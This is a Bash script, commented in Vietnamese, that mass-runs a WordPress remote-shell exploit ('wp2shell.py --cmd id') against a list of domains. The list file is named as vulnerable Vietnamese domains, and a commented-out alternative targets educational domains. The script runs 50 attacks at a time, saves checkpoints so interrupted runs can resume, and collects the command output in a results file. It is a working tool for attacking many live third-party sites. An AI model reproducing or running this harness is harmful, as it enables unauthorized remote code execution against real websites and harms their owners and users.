# Reference: https://github.com/Icex0/wp2shell-poc

#!/usr/bin/env bash
# Batch-based multithreaded wp2shell scanner
# Cách dùng: bash run.sh <user> [--reset]
set -uo pipefail

FILE="./data/vn_vuln_domain.txt"
OUT="results.txt"
CHECKPOINT=".run_checkpoint"
# FILE="./data/edu_domain.txt"
# OUT="edu_results.txt"
# CHECKPOINT=".run_checkpoint_edu"
MAX_JOBS=50  # ← Concurrent jobs (also = max folders at once)
BATCH_SIZE=$MAX_JOBS  # ← Domains per batch (50 domains = 50 jobs)
TEMP_DIR="temp"  # ← Temp directory (only has MAX_JOBS folders)

# ── Kiểm tra tham số ──────────────────────────────────────────────────────────
[ -z "${1:-}" ] && { echo "Dùng: $0 <user> [--reset]" >&2; exit 1; }
[ ! -f "$FILE" ] && { echo "Lỗi: Không tìm thấy file $FILE" >&2; exit 2; }

# ── Tạo thư mục temp ──────────────────────────────────────────────────────────
rm -rf "$TEMP_DIR"
mkdir -p "$TEMP_DIR"

USER_CMD="$1"
FORCE_RESET="${2:-}"

# ── Reset nếu yêu cầu ─────────────────────────────────────────────────────────
if [ "$FORCE_RESET" = "--reset" ]; then
    rm -f "$CHECKPOINT"
    echo "🗑  Đã xóa checkpoint — bắt đầu lại từ đầu."
fi

# ── Đọc checkpoint ────────────────────────────────────────────────────────────
START_FROM=0
if [ -f "$CHECKPOINT" ]; then
    cp_user=$(sed -n '1p' "$CHECKPOINT")
    cp_line=$(sed -n '2p' "$CHECKPOINT")
    if [ "$cp_user" = "$USER_CMD" ] && [[ "$cp_line" =~ ^[0-9]+$ ]] && [ "$cp_line" -gt 0 ]; then
        START_FROM="$cp_line"
        echo "⟳  Resume từ dòng $((START_FROM + 1)) (đã hoàn thành $START_FROM dòng)"
    else
        echo "⚠  Checkpoint không khớp (user đổi?) — chạy lại từ đầu."
    fi
fi

# ── Hàm lưu checkpoint ────────────────────────────────────────────────────────
save_checkpoint() {
    printf '%s\n%d\n' "$USER_CMD" "$1" > "$CHECKPOINT"
}

# ── Xử lý dừng đột ngột (Ctrl+C / kill) ──────────────────────────────────────
n=0
on_interrupt() {
    printf '\n⏸  Dừng sau dòng %d. Checkpoint đã lưu → "%s"\n' "$n" "$CHECKPOINT"
    printf '   Chạy lại: %s %s  để tiếp tục.\n' "$0" "$USER_CMD"
    # Kill all background jobs
    jobs -p | xargs -r kill 2>/dev/null || true
    # Cleanup temp directory
    rm -rf "$TEMP_DIR" 2>/dev/null || true
    exit 130
}
trap 'on_interrupt' SIGINT SIGTERM

# ── Worker function (runs in background) ──────────────────────────────────────
worker() {
    local slot="$1"      # Job slot (1-MAX_JOBS)
    local line_num="$2"  # Domain number (1-N)
    local line="$3"      # Domain name
    
    # 🔑 Directory per job slot (reused per batch)
    local slot_dir="$TEMP_DIR/slot_$slot"
    mkdir -p "$slot_dir"
    
    # Ghi vào result.txt bên trong slot folder
    {
        printf '=== [%d] %s ===\n' "$line_num" "$line"
        python3 wp2shell.py "$USER_CMD" "https://$line" --cmd id 2>&1
        printf '\n'
    } > "$slot_dir/result.txt"
}

# ── Hàm merge batch ───────────────────────────────────────────────────────────
merge_batch() {
    local batch_num=$1
    
    # Merge tất cả MAX_JOBS slot folders vào output
    for slot in $(seq 1 $MAX_JOBS); do
        slot_dir="$TEMP_DIR/slot_$slot"
        if [ -f "$slot_dir/result.txt" ]; then
            cat "$slot_dir/result.txt" >> "$OUT"
        fi
    done
}

# ── Hàm cleanup batch ──────────────────────────────────────────────────────────
cleanup_batch() {
    # Xóa tất cả slot folders (reuse cho batch tiếp)
    rm -rf "$TEMP_DIR"/slot_*
}

# ── Vòng lặp chính ────────────────────────────────────────────────────────────
batch_num=0

while IFS= read -r raw_line || [ -n "$raw_line" ]; do
    line=$(echo "$raw_line" | tr -d '\r' | xargs)
    [ -z "$line" ]       && continue
    [[ "$line" =~ ^# ]]  && continue

    n=$((n + 1))

    # Bỏ qua dòng đã chạy trước đó
    if [ "$n" -le "$START_FROM" ]; then
        printf '  ↷  [%d] Skip: %s\n' "$n" "$line"
        continue
    fi

    # ── Tính slot cho domain hiện tại ──────────────────────────────────────
    slot=$(( (n - 1) % MAX_JOBS + 1 ))

    printf '→  [%d] %s (slot %d)\n' "$n" "$line" "$slot"

    # Start worker in background
    worker "$slot" "$n" "$line" &

    # ── 🔑 FIXED: Simple batch detection - khi batch đầy ──────────────────
    # Khi n chia hết cho MAX_JOBS → batch đầy
    if [ $((n % MAX_JOBS)) -eq 0 ]; then
        printf '⏳  Batch %d: Chờ %d jobs hoàn thành...\n' "$batch_num" "$MAX_JOBS"
        wait  # ← CHỜ tất cả jobs xong
        printf '✅  Batch %d: Xong! Merging...\n' "$batch_num"
        merge_batch "$batch_num"
        cleanup_batch
        printf '🗑️  Batch %d: Cleanup xong.\n' "$batch_num"
        batch_num=$((batch_num + 1))
    fi

    # Lưu checkpoint sau mỗi domain
    save_checkpoint "$n"

done < "$FILE"

# ── Chờ batch cuối hoàn thành ──────────────────────────────────────────────────
# (có thể < MAX_JOBS jobs trong batch cuối)
if [ $n -gt $START_FROM ]; then
    # Nếu n không chia hết cho MAX_JOBS → có batch cuối chưa xử lý
    if [ $((n % MAX_JOBS)) -ne 0 ]; then
        remaining=$(( n % MAX_JOBS ))
        printf '⏳  Batch cuối: Chờ %d jobs hoàn thành...\n' "$remaining"
        wait  # ← CHỜ batch cuối xong
        printf '✅  Batch cuối: Xong! Merging...\n'
        merge_batch "$batch_num"
        cleanup_batch
        printf '🗑️  Batch cuối: Cleanup xong.\n'
    fi
fi

# ── Hoàn thành toàn bộ → xóa checkpoint & temp dir ──────────────────────────
rm -rf "$TEMP_DIR"
rm -f "$CHECKPOINT"
printf '\n✅  Hoàn thành %d dòng. Kết quả tại: %s\n' "$n" "$OUT"